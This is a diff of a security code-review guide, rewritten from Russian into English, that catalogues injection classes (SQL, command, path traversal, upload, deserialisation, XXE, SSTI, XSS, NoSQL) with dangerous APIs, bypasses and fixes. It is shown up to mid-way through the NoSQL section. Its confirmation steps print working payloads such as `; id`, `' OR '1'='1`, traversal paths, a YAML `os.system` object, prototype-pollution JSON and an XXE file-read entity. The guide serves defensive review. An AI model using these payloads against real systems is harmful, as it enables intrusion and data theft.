@@ -1,433 +1,505 @@
-# Каталог инъекций: source → sink
+# Injection catalogue: source → sink
 
-Пользовательский ввод сам по себе не баг. Опасно, когда он **достигает
-sink без обезвреживания под этот конкретный sink**. Цепочка всегда одна:
-source (запрос, файл, БД, ответ внешнего API) → поток без санитайзера
-→ sink (шелл, файловая система, SQL, HTML, интерпретатор шаблонов, LLM).
+User input is not a bug by itself. It becomes one when it **reaches a sink
+without neutralisation appropriate to that specific sink**. The chain is always
+the same: source (request, file, database, third-party API response) → a flow
+with no sanitiser → sink (shell, filesystem, SQL, HTML, template engine, LLM).
 
-Правильное обезвреживание зависит от **приёмника**, не от источника:
-эскейпинг под HTML не спасает от SQL-инъекции, экранирование под shell не
-спасает от path traversal. Поэтому на каждый sink — свой вопрос, а не
-общий «санитизируй ввод»:
+Correct neutralisation depends on the **sink**, not on the source: HTML escaping
+does not stop SQL injection, shell quoting does not stop path traversal. So the
+question is per-sink, never a general "sanitise the input":
 
-> **Параметризация/allowlist или конкатенация/фильтрация чёрным списком?**
+> **Parameterisation/allowlist, or concatenation/denylist filtering?**
 
-Чёрный список (regex на `../`, блок слов `<script>`, keyword-фильтр домена)
-почти всегда обходится — см. байпасы ниже по каждому классу. Белый список
-или структурный API (prepared statement, `execFile` со списком аргументов,
-canonical-path + prefix-check) обхода не имеет по конструкции.
+A denylist (a regex for `../`, a block on `<script>`, a keyword filter on a
+domain) is almost always bypassable — see the bypasses under each class below.
+An allowlist or a structural API (prepared statement, `execFile` with an
+argument list, canonical path + prefix check) has no bypass by construction.
 
-## 1. Command injection
+## 1. SQL injection
 
-**Где искать:** любой вызов, порождающий shell-процесс с данными из
-запроса, файла, имени, заголовка.
+The oldest class on the list and still the one most often reintroduced, because
+an ORM in the dependency list reads as protection while the one raw query in the
+reporting endpoint is where the bug lives.
 
-| Язык | Опасно | Безопасно |
+**Where to look:** any query built by string concatenation, f-string, `%`,
+`.format()`, or template literal; ORM escape hatches (`raw`, `extra`,
+`literal`, `text`, `queryRaw`, `session.execute`); dynamic `ORDER BY`/table
+names; search, filter, export and admin endpoints, which usually predate the
+ORM discipline of the rest of the codebase.
+
+| Language / layer | Dangerous | Safe |
+|---|---|---|
+| Python DB-API | `cur.execute(f"... {x}")`, `%` formatting | `cur.execute("... %s", (x,))` — parameters as the second argument |
+| SQLAlchemy | `text(f"...{x}")`, `.filter(text(...))` | `text("... :x")` + `.bindparams(x=x)` |
+| Django | `.extra(where=[...])`, `.raw(f"...")` | ORM lookups, `.raw("... %s", [x])` |
+| Node (pg/mysql) | `` query(`... ${x}`) `` | `query("... $1", [x])` / `?` placeholders |
+| Prisma / Knex | `$queryRawUnsafe`, `knex.raw("..." + x)` | `$queryRaw` tagged template, `knex.raw("?", [x])` |
+| Java | `Statement` + concatenation | `PreparedStatement` with `?` |
+| PHP | `mysqli_query("... $x")` | PDO prepared statements |
+
+Patterns reviewers miss:
+
+- **Identifiers cannot be parameterised.** Placeholders bind *values*, not table
+  or column names. A dynamic `ORDER BY {user_input}` or `SELECT * FROM {table}`
+  therefore has to be an **allowlist mapping** from an input token to a literal
+  identifier — quoting it is not enough.
+- **`LIMIT`/`OFFSET` built by formatting** — often assumed safe "because it is a
+  number". Safe only if the cast to `int` happens *before* the formatting and
+  cannot throw into a fallback that passes the raw string through.
+- **Second-order injection.** The value is stored safely through a parameterised
+  insert, then read back and concatenated into a second query. The dangerous
+  query has no user input visible next to it — the source is the database.
+- **Batch execution.** `executescript`, `multi=True`, or a driver with multiple
+  statements enabled turns any injection into stacked queries (`; DROP TABLE`).
+- **`LIKE` with user-controlled wildcards** — not injection, but `%` in a search
+  term can turn an indexed lookup into a full scan; that belongs to
+  `availability.md`, and is worth noting when you see it.
+- **Migrations and maintenance scripts.** They usually predate review, run as a
+  superuser, and take input from a config file or CLI argument — see the
+  measurement in SKILL.md Step 2 on non-HTTP entry points.
+
+**How to confirm:** call the real query function with a payload that changes the
+result set rather than one that breaks syntax — `' OR '1'='1`, `1 OR 1=1`, or a
+`UNION SELECT` matching the column count — and show the returned rows differ.
+Control group: the same payload against a parameterised version of the same
+query must return zero rows (or the literal string as data). A driver error
+message alone is a *hint*, not proof; boolean or time-based differential
+(`AND SLEEP(5)`) is proof when the error is suppressed.
+
+**Correct fix:** parameterised queries everywhere, an allowlist map for dynamic
+identifiers, a database account with only the privileges the endpoint needs.
+Escaping functions are a fallback for legacy code, not the primary defence.
+
+## 2. Command injection
+
+**Where to look:** any call that spawns a shell process with data from a
+request, file, filename, or header.
+
+| Language | Dangerous | Safe |
 |---|---|---|
 | Python | `subprocess.run(cmd, shell=True)`, `os.system(f"...{x}")`, `os.popen` | `subprocess.run([bin, arg1, arg2], shell=False)` |
-| Node | `child_process.exec(cmd)`, `` `cmd ${x}` `` | `execFile(bin, [arg1, arg2])` / `spawn` без shell |
+| Node | `child_process.exec(cmd)`, `` `cmd ${x}` `` | `execFile(bin, [arg1, arg2])` / `spawn` without a shell |
 | Ruby | `` `cmd #{x}` ``, `system("sh -c ...")`, `%x{}` | `system(bin, arg1, arg2)` (array form) |
-| PHP | `shell_exec`, `system`, `` `cmd` `` с конкатенацией | `escapeshellarg` + всё равно предпочесть без shell |
+| PHP | `shell_exec`, `system`, `` `cmd` `` with concatenation | `escapeshellarg` — and still prefer no shell |
 
-Паттерны, которые часто пропускают при ревью:
+Patterns often missed in review:
 
-- **Argument injection** — даже без метасимволов шелла. Если ввод попадает
-  как *аргумент* в `execFile(bin, [userInput])`, а `userInput` начинается с
-  `-`, это может быть флаг, а не значение: `--output=/etc/passwd`,
-  `-oProxyCommand=...` в `ssh`/`scp`/`rsync`, `--checkout` в `git`.
-  Фикс: `--` перед пользовательскими аргументами (`[bin, '--', userInput]`),
-  либо явная проверка, что значение не начинается с `-`.
-- **Путь к бинарю из окружения** — `PATH`, переменная окружения или
-  относительный путь, контролируемые атакующим (загруженный файл в cwd),
-  подменяют вызываемую программу. Смотреть, откуда берётся `bin`/`cmd[0]`.
-- Backtick / `$()` / `;` / `|` / `&&` внутри `shell=True` — классика, но
-  проверяй именно потому что легко пропустить, если ввод похож на «просто
-  имя файла».
+- **Argument injection** — no shell metacharacters required. If input lands as an
+  *argument* in `execFile(bin, [userInput])` and `userInput` starts with `-`, it
+  may be parsed as a flag rather than a value: `--output=/etc/passwd`,
+  `-oProxyCommand=...` for `ssh`/`scp`/`rsync`, `--upload-pack` for `git`.
+  Fix: `--` before user arguments (`[bin, '--', userInput]`), or an explicit
+  check that the value does not start with `-`.
+- **Binary path from the environment** — `PATH`, an environment variable, or a
+  relative path under attacker control (an uploaded file in the cwd) substitutes
+  the program being run. Trace where `bin`/`cmd[0]` comes from.
+- Backtick / `$()` / `;` / `|` / `&&` inside `shell=True` — the classic, worth
+  checking precisely because it is easy to skim past when the input "is just a
+  filename".
 
-**Как подтвердить:** воспроизводящий прогон с payload `; id`, `$(id)`,
-`--help` (для argument injection) на реальной функции/эндпоинте, показать
-выполнение постороннего процесса или изменение поведения бинаря.
+**How to confirm:** a reproducing run against the real function or endpoint with
+`; id`, `$(id)`, or `--help` (for argument injection), showing a foreign process
+executing or the binary's behaviour changing.
 
-**Правильный фикс:** список аргументов без интерпретации шеллом
-(`shell=False`/`execFile`), `--` перед пользовательскими значениями,
-allowlist разрешённых бинарей/подкоманд. Экранирование строк — последняя
-линия, не основная защита.
+**Correct fix:** an argument list with no shell interpretation
+(`shell=False`/`execFile`), `--` before user values, an allowlist of permitted
+binaries and subcommands. String escaping is the last line, not the main one.
 
-## 2. Path traversal
+## 3. Path traversal
 
-**Где искать:** `open(base + user_input)`, `fs.readFile(path.join(base, x))`,
-загрузка/отдача файла по имени/id из запроса, распаковка архивов.
+**Where to look:** `open(base + user_input)`, `fs.readFile(path.join(base, x))`,
+upload/download by name or id from the request, archive extraction.
 
-Обходы, которые фильтр `if ".." in path` пропускает:
+Bypasses that an `if ".." in path` filter lets through:
 
-- **URL-кодирование / двойное кодирование** — `%2e%2e%2f`, `%252e%252e%252f`
-  (декодируется дважды прокси+приложением).
-- **Абсолютный путь** — `/etc/passwd` игнорирует `base`, если код делает
-  `os.path.join(base, user_input)` — на Windows и в Python `os.path.join`
-  с абсолютным вторым аргументом **отбрасывает** `base` целиком.
-- **Null-байт** — `file.txt\x00.jpg` обрезает расширение в старых
-  рантаймах/либах на C-биндингах, обходя проверку по суффиксу.
-- **Windows-разделители** — `..\\..\\`, смешение `/` и `\`, `8.3` short
-  name (`PROGRA~1`) на фильтрах, которые проверяют только `/`.
-- **Символические ссылки** — файл внутри разрешённой директории оказывается
-  симлинком наружу; проверка пути строкой это не ловит, только резолв
-  файловой системы (`realpath`).
-- **Zip slip** — запись из архива с путём `../../etc/cron.d/x` в имени
-  entry; распаковщик, который не проверяет путь каждого entry после
-  join с целевой директорией, пишет куда угодно.
+- **URL encoding / double encoding** — `%2e%2e%2f`, `%252e%252e%252f` (decoded
+  twice by proxy plus application).
+- **Absolute path** — `/etc/passwd` ignores `base` entirely: Python's
+  `os.path.join` with an absolute second argument **discards** `base`.
+- **Null byte** — `file.txt\x00.jpg` truncates the extension in older runtimes
+  and C-binding libraries, defeating a suffix check.
+- **Windows separators** — `..\\..\\`, mixed `/` and `\`, `8.3` short names
+  (`PROGRA~1`) against filters that only look for `/`.
+- **Symlinks** — a file inside the permitted directory is a symlink pointing
+  out of it; a string check never catches this, only filesystem resolution
+  (`realpath`).
+- **Zip slip** — an archive entry named `../../etc/cron.d/x`; an extractor that
+  does not re-check each entry's path after joining it to the target directory
+  writes anywhere.
 
-**Как подтвердить:** прогнать `../../../etc/passwd`, `..%2f..%2fetc%2fpasswd`,
-абсолютный путь и (если применимо) архив с traversal-entry через реальную
-функцию чтения/записи/распаковки, показать содержимое файла вне `base`.
+**How to confirm:** run `../../../etc/passwd`, `..%2f..%2fetc%2fpasswd`, an
+absolute path, and (where applicable) an archive with a traversal entry through
+the real read/write/extract function, and show content from outside `base`.
 
-**Правильный фикс:** `os.path.realpath()`/`path.resolve()` до канонического
-абсолютного пути, затем проверка что он **начинается с** канонического
-`base` (`+ os.sep`, чтобы `/base-evil` не прошёл как префикс `/base`).
-Фильтрация подстроки `..` не фикс — обходится кодированием и абсолютным
-путём.
+**Correct fix:** `os.path.realpath()`/`path.resolve()` to a canonical absolute
+path, then check it **starts with** the canonical `base` (plus `os.sep`, so that
+`/base-evil` does not pass as a prefix of `/base`). Filtering the substring `..`
+is not a fix — encoding and absolute paths get past it.
 
-## 3. Загрузка файлов
+## 4. File upload
 
-**Где искать:** endpoint приёма multipart/upload, дальнейшая обработка
-загруженного файла (сохранение, раздача, обработка изображением).
+**Where to look:** the multipart/upload endpoint and everything that happens to
+the file afterwards (storing, serving, image processing).
 
-| Проверка | Почему недостаточно |
+| Check | Why it is not enough |
 |---|---|
-| Расширение имени файла (`.jpg`, `.pdf`) | Переименовать любой файл — тривиально |
-| `Content-Type` из запроса клиента | Клиент присылает любой заголовок, это не проверка содержимого |
-| Проверка по magic bytes (реальный фикс) | Нужно читать первые байты и сверять с сигнатурой формата |
+| Filename extension (`.jpg`, `.pdf`) | Renaming a file is trivial |
+| `Content-Type` from the client | The client sends any header it likes; this inspects nothing |
+| Magic-byte check (the real fix) | Requires reading the leading bytes and matching the format signature |
 
-Конкретные дыры:
+Concrete holes:
 
-- **Имя файла от клиента → путь сохранения напрямую** — `../` в имени
-  (см. п.2), либо просто перезапись существующего файла тем же именем
-  (race/overwrite чужого upload). Генерировать имя на сервере (UUID),
-  оригинальное имя — только в метаданные.
-- **Сохранение в директорию, которую раздаёт веб-сервер** (`/public/uploads`,
-  `/static`) без ограничения исполняемости → загруженный `.php`/`.jsp`/`.asp`
-  выполняется как код, если сервер настроен исполнять скрипты из этой
-  директории. Проверить: раздаётся ли директория напрямую, настроен ли
-  `execute` для неё в конфиге веб-сервера.
-- **Полиглоты** — файл, валидный одновременно как разрешённый формат
-  (GIF/JPEG) и как HTML/JS (GIFAR-style, JPEG с полезной нагрузкой после
-  EXIF). Если сервер отдаёт файл с `Content-Type` по расширению, а браузер
-  делает content-sniffing — грузится как HTML → stored XSS. Фикс:
-  `Content-Disposition: attachment` и/или отдельный домен без cookies для
-  user-content, `X-Content-Type-Options: nosniff`.
-- **SVG с `<script>` / `onload`** — SVG это XML, разрешён как «картинка», но
-  рендерится браузером как документ, если открыт напрямую (не через `<img>`).
-  Проверить: санитизируется ли SVG (удаление `<script>`, `on*`-атрибутов,
-  `xlink:href` на внешний ресурс) перед отдачей.
-- **Обработка уязвимой библиотекой** — ImageMagick (`convert`, полотно
-  `MSL`/`MVG` payload → RCE, класс "ImageTragick"), libvips, PDF-рендереры.
-  Проверить версию библиотеки и её CVE, не только сам факт «мы проверяем
-  magic bytes».
+- **Client filename used directly as the storage path** — `../` in the name (see
+  §3), or simply overwriting an existing file with the same name (a race, or
+  clobbering someone else's upload). Generate the name server-side (UUID); keep
+  the original only as metadata.
+- **Storing into a directory the web server serves** (`/public/uploads`,
+  `/static`) without disabling execution → an uploaded `.php`/`.jsp`/`.asp` runs
+  as code if the server is configured to execute scripts there. Check whether the
+  directory is served directly and whether `execute` is enabled for it.
+- **Polyglots** — a file valid both as a permitted format (GIF/JPEG) and as
+  HTML/JS (GIFAR-style, a JPEG with a payload after EXIF). If the server sets
+  `Content-Type` from the extension and the browser sniffs content, it loads as
+  HTML → stored XSS. Fix: `Content-Disposition: attachment` and/or a separate
+  cookieless domain for user content, plus `X-Content-Type-Options: nosniff`.
+- **SVG with `<script>` / `onload`** — SVG is XML, allowed as "an image", but
+  rendered as a document when opened directly (not via `<img>`). Check whether
+  SVG is sanitised (strip `<script>`, `on*` attributes, external `xlink:href`)
+  before it is served.
+- **Processing by a vulnerable library** — ImageMagick (`convert`, `MSL`/`MVG`
+  payload → RCE, the "ImageTragick" class), libvips, PDF renderers. Check the
+  library version and its CVEs, not only that magic bytes are validated.
 
-**Как подтвердить:** загрузить файл с подменённым расширением/типом,
-показать, что magic-bytes-проверка отсутствует или обходится; для zip
-slip/полиглотов — показать итоговый путь записи или итоговый
-`Content-Type` при отдаче.
+**How to confirm:** upload a file with a mismatched extension/type and show the
+magic-byte check is absent or bypassable; for zip slip and polyglots, show the
+resulting write path or the `Content-Type` used when serving.
 
-**Правильный фикс:** проверка содержимого (magic bytes / декодирование
-как заявленный формат), генерация имени на сервере, раздача
-user-content с отдельного домена/без выполнения скриптов,
-`Content-Disposition: attachment`, санитизация SVG или запрет SVG вовсе.
+**Correct fix:** content inspection (magic bytes, or decoding as the declared
+format), server-generated names, user content served from a separate domain with
+script execution off, `Content-Disposition: attachment`, SVG sanitised or refused.
 
-## 4. Небезопасная десериализация
+## 5. Unsafe deserialisation
 
-**Где искать:** любая точка, где сериализованные данные приходят **извне**
-(тело запроса, cookie, кэш, очередь) и десериализуются в объект.
+**Where to look:** any point where serialised data arrives **from outside** (request
+body, cookie, cache, queue) and is turned back into an object.
 
-| Паттерн | Риск |
+| Pattern | Risk |
 |---|---|
-| `pickle.loads(x)` на внешних данных | Произвольное исполнение кода при десериализации (Python pickle исполняет `__reduce__`) |
-| `yaml.load(x)` без `Loader=yaml.SafeLoader` | `yaml.load` с полным loader'ом инстанцирует произвольные Python-объекты (`!!python/object/apply`) |
-| `marshal.loads` | Аналогично pickle, ещё менее предназначен для недоверенных данных |
-| Java `ObjectInputStream.readObject()` на внешних данных | Классический gadget-chain RCE (Apache Commons Collections и т.п.) |
-| `JSON.parse(x, reviver)` с reviver, доверяющим ключам | Reviver, исполняющий логику по ключам объекта, — вектор, если ключи не валидируются |
-| Глубокий merge/`Object.assign` с ключами из JSON | **Prototype pollution**: `{"__proto__": {"isAdmin": true}}` или `{"constructor": {"prototype": {...}}}` меняет прототип `Object` глобально |
-| `eval()` / `new Function(x)` / `vm.runInNewContext` на пользовательских данных | Прямое исполнение кода |
+| `pickle.loads(x)` on external data | Arbitrary code execution during deserialisation (Python pickle runs `__reduce__`) |
+| `yaml.load(x)` without `Loader=yaml.SafeLoader` | The full loader instantiates arbitrary Python objects (`!!python/object/apply`) |
+| `marshal.loads` | As pickle, and even less intended for untrusted data |
+| Java `ObjectInputStream.readObject()` on external data | The classic gadget-chain RCE (Apache Commons Collections and friends) |
+| `JSON.parse(x, reviver)` with a reviver that trusts keys | A reviver executing logic keyed on object keys is a vector when keys are unvalidated |
+| Deep merge / `Object.assign` with keys from JSON | **Prototype pollution**: `{"__proto__": {"isAdmin": true}}` mutates `Object`'s prototype globally |
+| `eval()` / `new Function(x)` / `vm.runInNewContext` on user data | Direct code execution |
 
-**Как подтвердить:**
-- pickle/marshal: сериализовать пейлоад с `__reduce__`, вызывающий
-  безобидную, но заметную команду (`touch /tmp/poc`), скормить в реальный
-  `loads`, показать эффект.
-- YAML: `!!python/object/apply:os.system ["id"]` в `yaml.load`.
-- Prototype pollution: отправить `{"__proto__":{"polluted":"yes"}}` в JSON
-  body, который проходит через merge-функцию, затем показать, что
-  `{}.polluted === "yes"` в новом объекте после запроса — глобальное
-  загрязнение прототипа.
+**How to confirm:**
+- pickle/marshal: serialise a payload whose `__reduce__` runs something harmless
+  but observable (`touch /tmp/poc`), feed it to the real `loads`, show the effect.
+- YAML: `!!python/object/apply:os.system ["id"]` through `yaml.load`.
+- Prototype pollution: send `{"__proto__":{"polluted":"yes"}}` to a body that
+  passes through the merge function, then show `{}.polluted === "yes"` on a
+  fresh object afterwards — global prototype contamination.
 
-**Правильный фикс:** не десериализовать недоверенные данные форматами,
-исполняющими код (pickle/marshal/Java native serialization) — заменить на
-JSON/protobuf со строгой схемой. YAML — только `SafeLoader`. Merge —
-проверять и отбрасывать ключи `__proto__`/`constructor`/`prototype`, либо
-`Object.create(null)` и `structuredClone`/библиотека с защитой (не
-`lodash.merge` старых версий).
+**Correct fix:** do not deserialise untrusted data with formats that execute code
+(pickle/marshal/Java native serialisation) — use JSON/protobuf with a strict
+schema. YAML only through `SafeLoader`. For merges, reject `__proto__`/
+`constructor`/`prototype` keys, or use `Object.create(null)` plus
+`structuredClone` or a library that guards against it (not old `lodash.merge`).
 
-## 5. SSTI (Server-Side Template Injection)
+## 6. XXE and XML parsing
 
-Путать с обычным XSS нельзя: здесь ввод попадает не в **данные** шаблона
-(`{{ user_input }}` как значение переменной — это нормально), а
-**в сам код шаблона**, который затем компилируется и исполняется.
+XML is not just an API format: it hides inside SVG, DOCX/XLSX/ODF, SOAP, RSS,
+SAML assertions, sitemaps and configuration files. Any of those reaching a parser
+with external entities enabled is the same bug.
 
-**Признак в коде:** `render_template_string(user_input)`,
-`Template(user_input).render()`, `Twig::createTemplate(userInput)`,
-`Handlebars.compile(userInput)`, конкатенация строки в f-string/template
-literal с последующей передачей в рендерер, а не в переменную контекста.
+**The mechanism:** a document declares an entity pointing at a local file or a
+URL, and the parser dereferences it while parsing — before your code sees any of
+it. That yields file read (`file:///etc/passwd`), SSRF from the server's network
+position (`http://169.254.169.254/...` — cross-reference `ssrf-bypasses.md`), and
+denial of service.
 
-| Движок | Payload для подтверждения | Ожидаемый безопасный ответ vs уязвимый |
+| Stack | Dangerous | Safe |
 |---|---|---|
-| Jinja2 (Python) | `{{7*7}}` | `{{7*7}}` литералом vs `49` |
-| Twig (PHP) | `{{7*7}}` | то же |
-| Freemarker (Java) | `${7*7}` | то же |
-| Handlebars (JS) | `{{#with "constructor"}}...{{/with}}` (доступ к `constructor` для RCE-цепочки) | ошибка/литерал vs исполнение |
-| ERB (Ruby) | `<%= 7*7 %>` | то же |
+| Python | `lxml.etree.parse` with a default parser, `xml.dom.minidom`, `xml.sax` | `defusedxml`, or `etree.XMLParser(resolve_entities=False, no_network=True)` |
+| Java | `DocumentBuilderFactory` / `SAXParserFactory` at defaults | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
+| PHP | `libxml_disable_entity_loader(false)`, old libxml | Keep entity loading off; parse with `LIBXML_NONET` |
+| Node | `libxmljs` with `noent: true`, some `xml2js` configurations | Leave entity expansion off; prefer a parser without DTD support |
+| .NET | `XmlDocument` with a non-null `XmlResolver` | `XmlResolver = null`, `DtdProcessing.Prohibit` |
 
-**Как подтвердить:** отправить `{{7*7}}` (или аналог движка) в поле,
-которое, по коду, идёт в шаблонизатор как строка шаблона (не как
-переменная контекста). Если в ответе `49` — движок исполнил ввод как
-код шаблона, не как текст. Дальше эскалация до RCE зависит от движка
-(Jinja2: `{{ config.__class__.__init__.__globals__... }}` — показывать
-только до момента подтверждения, не заниматься полной эксплуатацией).
+Related failures in the same place:
 
-**Правильный фикс:** пользовательские данные — только в **контекст**
-рендера (`render_template('page.html', name=user_input)`), никогда в
-исходный текст шаблона. Если нужен пользовательский «шаблон» как фича
-(конструктор писем и т.п.) — sandboxed-окружение движка (Jinja2
-`SandboxedEnvironment`, и то с оговорками) или собственный ограниченный
-mini-language без доступа к объектной модели языка.
+- **Billion laughs / quadratic blowup** — nested entity expansion turning a few
+  kilobytes into gigabytes of memory. This is a DoS, not a read; see
+  `availability.md` for severity.
+- **XInclude** — file inclusion even where DTD processing is off, if XInclude is
+  enabled separately.
+- **XSLT from user input** — a transform is a program; treat it like SSTI (§7).
+- **SAML and signature wrapping** — signed XML where the parser and the signature
+  verifier disagree about which element is authoritative. If the project verifies
+  SAML or XML signatures by hand, that is a finding in itself; use a library.
 
-## 6. XSS полностью
+```
+grep -rnE "etree\.(parse|fromstring)|minidom|xml\.sax|DocumentBuilderFactory|SAXParser|libxmljs|XmlDocument|resolve_entities|noent"
+```
 
-Три вида по source: **reflected** (ввод из текущего запроса сразу в ответ),
-**stored** (ввод сохранён в БД, отдаётся другим пользователям), **DOM-based**
-(источник и sink оба в браузере, сервер не участвует — `location.hash` →
-`innerHTML`, часто пропускается serverside-сканерами).
+**How to confirm:** parse a document declaring
+`<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/hostname">]>` and referencing `&e;`
+through the project's real parsing function, and show the file contents in the
+parsed output — or, for blind cases, an outbound request to a host you control.
+Control group: the same document through `defusedxml` (or the hardened parser
+config) must raise or return the entity unexpanded.
 
-**JS-sink'и (DOM-based, искать в клиентском коде):**
+**Correct fix:** disable DTDs and external entities at the parser, prefer a
+hardened library (`defusedxml` and equivalents), and cap document size and
+expansion depth.
 
-| Sink | Риск |
+## 7. SSTI (Server-Side Template Injection)
+
+Not to be confused with ordinary XSS: here the input lands not in the template's
+**data** (`{{ user_input }}` as a variable value is fine) but **in the template
+source**, which is then compiled and executed.
+
+**The tell in code:** `render_template_string(user_input)`,
+`Template(user_input).render()`, `Twig::createTemplate(userInput)`,
+`Handlebars.compile(userInput)`, or string concatenation into an f-string or
+template literal that is then handed to the renderer rather than to the context.
+
+| Engine | Confirming payload | Safe vs vulnerable response |
+|---|---|---|
+| Jinja2 (Python) | `{{7*7}}` | literal `{{7*7}}` vs `49` |
+| Twig (PHP) | `{{7*7}}` | same |
+| Freemarker (Java) | `${7*7}` | same |
+| Handlebars (JS) | `{{#with "constructor"}}...{{/with}}` | error/literal vs execution |
+| ERB (Ruby) | `<%= 7*7 %>` | same |
+
+**How to confirm:** send `{{7*7}}` (or the engine's equivalent) into a field that
+the code routes into the engine as template *source*, not as a context variable.
+`49` in the response means the engine executed the input as template code.
+Escalation to RCE is engine-specific — go only as far as confirmation, do not
+run a full exploitation chain.
+
+**Correct fix:** user data only in the render **context**
+(`render_template('page.html', name=user_input)`), never in template source. If
+user-authored templates are a genuine feature (an email builder, say), use a
+sandboxed environment (Jinja2 `SandboxedEnvironment`, with caveats) or a
+restricted mini-language with no access to the language object model.
+
+## 8. XSS in full
+
+Three kinds by source: **reflected** (input from the current request echoed into
+the response), **stored** (input persisted and served to other users), and
+**DOM-based** (source and sink both in the browser, the server not involved —
+`location.hash` → `innerHTML`, routinely missed by server-side scanners).
+
+**JS sinks (DOM-based; look in client code):**
+
+| Sink | Risk |
 |---|---|
-| `.innerHTML`, `.outerHTML` | Вставка непроверенной строки — исполнение `<script>`/обработчиков |
-| `document.write(x)` | То же, плюс перезаписывает документ |
-| `.insertAdjacentHTML(pos, x)` | То же |
-| `eval(x)`, `new Function(x)`, `setTimeout(x, t)` со строкой | Исполнение произвольного JS |
-| `location = x`, `location.href = x`, `<a href="javascript:...">` | `javascript:`-URI из пользовательских данных |
-| `element.srcdoc = x` | iframe с произвольным HTML/JS |
+| `.innerHTML`, `.outerHTML` | Inserting an unchecked string executes `<script>` and handlers |
+| `document.write(x)` | The same, and it rewrites the document |
+| `.insertAdjacentHTML(pos, x)` | The same |
+| `eval(x)`, `new Function(x)`, `setTimeout(x, t)` with a string | Arbitrary JS execution |
+| `location = x`, `location.href = x`, `<a href="javascript:...">` | `javascript:` URI from user data |
+| `element.srcdoc = x` | An iframe with arbitrary HTML/JS |
 
-**Фреймворки, которые «выключают» встроенную защиту:**
+**Frameworks whose built-in protection has been switched off:**
 
-- React `dangerouslySetInnerHTML={{__html: x}}` — имя говорит само за себя,
-  искать буквально grep'ом.
+- React `dangerouslySetInnerHTML={{__html: x}}` — the name says it; grep for it
+  literally.
 - Vue `v-html="x"`.
 - Angular `bypassSecurityTrustHtml`/`bypassSecurityTrustScript`/
-  `bypassSecurityTrustUrl` — явный обход санитайзера Angular.
-- Серверные шаблоны с отключённым автоэскейпингом: Jinja2/Django `|safe`,
-  `Markup(x)`; Handlebars тройные скобки `{{{ x }}}` (обычные `{{ }}`
-  экранируют, тройные — нет).
+  `bypassSecurityTrustUrl` — an explicit bypass of Angular's sanitiser.
+- Server templates with auto-escaping off: Jinja2/Django `|safe`, `Markup(x)`;
+  Handlebars triple braces `{{{ x }}}` (double braces escape, triple do not).
 
-**JSON, вставляемый в `<script>`:** `<script>var data = {{ json_data }};</script>`
-— если `json_data` содержит `</script>`, это закрывает тег и переходит в
-HTML-контекст (`</script><script>alert(1)</script>`). Фикс: экранировать
-`<` в JSON-строке как `<` перед вставкой в `<script>`, либо `JSON.stringify`
-с последующей заменой `/</g` → `<`.
+**JSON embedded in `<script>`:** `<script>var data = {{ json_data }};</script>` —
+if `json_data` contains `</script>`, it closes the tag and switches to HTML
+context (`</script><script>alert(1)</script>`). Fix: escape `<` as `<`
+inside the JSON string before embedding.
 
-**Как подтвердить:** payload вида `<img src=x onerror=alert(document.domain)>`
-(reflected/stored) или `#<img src=x onerror=...>` при DOM-sink через
-`location.hash`; показать факт исполнения (alert/консоль), не просто факт
-отражения строки в ответе — отражение без исполнения не XSS.
+**How to confirm:** a payload such as `<img src=x onerror=alert(document.domain)>`
+(reflected/stored), or `#<img src=x onerror=...>` for a DOM sink fed from
+`location.hash`; show it executing (alert/console), not merely that the string is
+reflected — reflection without execution is not XSS.
 
-**CSP — второй рубеж, не замена эскейпингу.** Правильный CSP
-(`script-src 'self'` без `'unsafe-inline'`/`'unsafe-eval'`, без wildcard-хостов)
-снижает импакт, но отсутствие эскейпинга — это баг сам по себе, и слабый CSP
-(`unsafe-inline` есть почти всегда «для совместимости») его не компенсирует.
-Проверять CSP отдельным пунктом, не вместо фикса на sink.
+**CSP is a second line, not a replacement for escaping.** A good CSP
+(`script-src 'self'` with no `'unsafe-inline'`/`'unsafe-eval'`, no wildcard
+hosts) reduces impact, but missing escaping is a bug in itself, and a weak CSP
+(`unsafe-inline` is nearly always there "for compatibility") does not compensate.
+Check CSP as its own item, not instead of the sink fix.
 
-**Правильный фикс:** контекстно-зависимый эскейпинг на выходе (не на входе)
-средствами фреймворка (React/Vue экранируют `{}`/`{{ }}` по умолчанию — дыра
-там, где это осознанно обошли), `textContent` вместо `innerHTML`, санитайзер
-типа DOMPurify если HTML от пользователя действительно нужен рендерить.
+**Correct fix:** context-aware escaping on output (not on input) through the
+framework — React/Vue escape `{}`/`{{ }}` by default, so the hole is wherever
+that was deliberately bypassed — `textContent` instead of `innerHTML`, and a
+sanitiser such as DOMPurify where user HTML genuinely has to be rendered.
 
-## 7. NoSQL-инъекция
+## 9. NoSQL injection
 
-**Где искать:** MongoDB/аналоги, куда объект из тела запроса или query-string
-попадает в фильтр без приведения типа.
+**Where to look:** MongoDB and equivalents, where an object from the request body
+or query string reaches a filter without a type cast.
 
-- **Операторный инжект через JSON body** — `{"password": {"$ne": null}}`
-  вместо строки пароля обходит `db.users.find({username, password})`, если
-  `password` не приведён к строке до попадания в запрос: `$ne`/`$gt`/`$in`
-  как значение поля меняют семантику запроса на «не равно» вместо
-  «равно этому паролю».
-- **`$regex` как вектор ReDoS** — `{"field": {"$regex": "(a+)+$"}}` от
-  клиента грузит CPU движка регулярок сервера.
-- **`$where` с произвольным JS** — `{"$where": "this.a == this.b"}` (или
-  сложнее) исполняет JavaScript **на сервере БД**. Документация MongoDB не
-  описывает модель изоляции этого контекста (доступ к ФС/сети не подтверждён,
-  но и не опровергнут), поэтому считай риском исполнения кода, а не «просто
-  фильтром»: как минимум CPU-DoS и обход логики запроса. `$where` deprecated с
-  MongoDB 8.0; server-side JS полностью выключается
-  `security.javascriptEnabled: false` (или `--noscripting`) — это и есть фикс.
-- **Аггрегационный pipeline из пользовательского ввода** — `$lookup`,
-  `$merge` с параметрами от клиента могут читать/писать чужие коллекции.
-- **Query-string парсер, превращающий строку в объект** — `qs`/`express`
-  по умолчанию парсят `?user[$ne]=1` в `{user: {"$ne": "1"}}`. Если
-  эндпоинт ожидал `user` строкой, а получает объект — это тот же
-  операторный инжект, но source — GET-параметр, не body.
+- **Operator injection through a JSON body** — `{"password": {"$ne": null}}`
+  instead of a password string defeats `db.users.find({username, password})` if
+  `password` is not cast to a string first: `$ne`/`$gt`/`$in` as a field value
+  change the query's meaning from "equals this password" to "does not equal".
+- **`$regex` as a ReDoS vector** — `{"field": {"$regex": "(a+)+$"}}` from a client
+  burns CPU in the server's regex engine.
